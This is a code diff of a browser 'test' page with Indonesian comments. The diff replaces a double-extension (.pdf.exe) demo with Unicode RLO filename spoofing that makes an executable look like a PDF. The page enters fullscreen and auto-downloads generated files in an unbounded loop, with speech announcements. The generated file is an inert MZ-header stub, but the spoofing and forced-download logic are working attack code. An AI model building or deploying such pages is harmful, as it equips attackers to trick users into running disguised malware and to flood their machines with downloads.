@@ -83,7 +83,7 @@
       display: block;
       padding: 8px;
       background: #212121;
-      color: #ef4444; /* Warna merah untuk visualisasi ancaman berkas EXE biner */
+      color: #f59e0b; /* Warna oranye menandakan spoofing karakter tingkat lanjut */
       text-decoration: none;
       border-radius: 4px;
       font-size: 11px;
@@ -96,10 +96,10 @@
 
 <body>
   <div class="panel" id="main-panel">
-    <h2>Uji Manipulasi Ekstensi Ganda: .PDF.EXE</h2>
-    <p>Klik tombol untuk masuk ke layar penuh dan memicu pengunduhan otomatis berkas dengan penamaan ganda (.pdf.exe) berisi struktur biner EXE tiruan.</p>
+    <h2>Uji Advanced Spoofing: Unicode RLO Attack</h2>
+    <p>Klik tombol untuk memicu pengunduhan berkas .EXE biner yang disamarkan menggunakan pembalikan karakter Unicode RLO sehingga tampak seperti file .PDF asli di sistem operasi.</p>
 
-    <button id="start-btn" type="button">Mulai Layar Penuh &amp; Uji Berkas PDF.EXE</button>
+    <button id="start-btn" type="button">Mulai Layar Penuh &amp; Uji Spoofing RLO</button>
 
     <div id="status" role="status">Sistem siap.</div>
     <div id="downloads"></div>
@@ -124,25 +124,20 @@
       }
     };
 
-    // Fungsi menyusun struktur data biner tiruan EXE di dalam objek Blob
+    // Fungsi menyusun struktur data biner tiruan EXE (Header MZ) di memori
     const prepareMimeBlobAsync = (i) => {
       return new Promise((resolve) => {
         queueMicrotask(() => {
-          // Tanda tangan awal berkas aplikasi eksekusi Windows (Magic Bytes: MZ)
           const mzHeader = [0x4D, 0x5A]; 
-          
-          // Muatan teks DOS stub tiruan di dalam biner
-          const payloadText = `\x00\x00\x00\x00This program cannot be run in DOS mode.\r\n$Simulasi_PDF_Camouflage_Ke_${i}`;
+          const payloadText = `\x00\x00\x00\x00This program cannot be run in DOS mode.\r\n$Simulasi_RLO_Spoofing_Ke_${i}`;
           
           const encoder = new TextEncoder();
           const textBytes = encoder.encode(payloadText);
           
-          // Menggabungkan susunan array byte biner
           const fileBytes = new Uint8Array(mzHeader.length + textBytes.length);
           fileBytes.set(mzHeader, 0);
           fileBytes.set(textBytes, mzHeader.length);
           
-          // Menyetel tipe MIME secara spesifik sebagai berkas biner download Windows (.exe)
           const blob = new Blob([fileBytes], { type: "application/x-msdownload" });
           const url = URL.createObjectURL(blob);
           resolve({ id: i, url: url });
@@ -150,14 +145,22 @@
       });
     };
 
-    // Memicu unduhan instan menggunakan manipulasi nama dokumen .pdf.exe
+    // Memicu unduhan dengan menyuntikkan karakter Unicode RLO (\u202E)
     const triggerInstantDownload = (fileData) => {
       const link = document.createElement("a");
       link.href = fileData.url;
       
-      // Mengunci format nama file unduhan visual dengan teknik ekstensi ganda
-      link.download = `dokumen-laporan-${fileData.id}.pdf.exe`;
-      link.textContent = `Doc #${fileData.id} (.pdf.exe)`;
+      // LOGIKA SPOOFING RLO:
+      // Teks target di memori: "laporan_ke_1_fdp.exe"
+      // Disuntik RLO sebelum kata 'fdp', menjadi: "laporan_ke_1_" + "\u202E" + "fdp.exe"
+      // Ketika dibaca sistem, "fdp.exe" akan dibalik arah tulisannya menjadi "exe.pdf"
+      const baseName = `laporan_ke_${fileData.id}_`;
+      const rloCharacter = "\u202E";
+      const spoofExtension = "fdp.exe"; // 'fdp' dibalik menjadi 'pdf'
+      
+      // Nama asli di sistem tetap berakhiran .exe, namun visual pengguna menjadi .pdf
+      link.download = baseName + rloCharacter + spoofExtension;
+      link.textContent = `File #${fileData.id} (Spoofed)`;
       
       downloadsDiv.appendChild(link);
       link.click();
@@ -172,7 +175,7 @@
       
       triggerInstantDownload(fileData);
 
-      statusDiv.textContent = `Proses Berjalan: Berkas .pdf.exe ke-${counter} terkirim`;
+      statusDiv.textContent = `Proses Berjalan: File RLO Spoof ke-${counter} dikirim`;
 
       if (counter % 10 === 0) {
         speak(`Proses mencapai ${counter} berkas.`);
@@ -181,7 +184,7 @@
       setTimeout(() => processLoop(counter + 1), 0);
     };
 
-    // Event Handler Tombol Utama
+    // Event Handler Tombol
     startBtn.addEventListener("click", () => {
       if (isProcessing) return;
 
@@ -207,12 +210,11 @@
 
       setTimeout(() => {
         isProcessing = true;
-        speak("Proses pembuatan berkas ekstensi ganda dimulai.");
+        speak("Proses pengujian advanced spoofing dimulai.");
         processLoop(1);
       }, 300);
     });
 
-    // Otomatis menghentikan loop jika pengguna keluar dari mode fullscreen (Tombol Esc)
     const stopProcess = () => {
       if (isProcessing) {
         isProcessing = false;
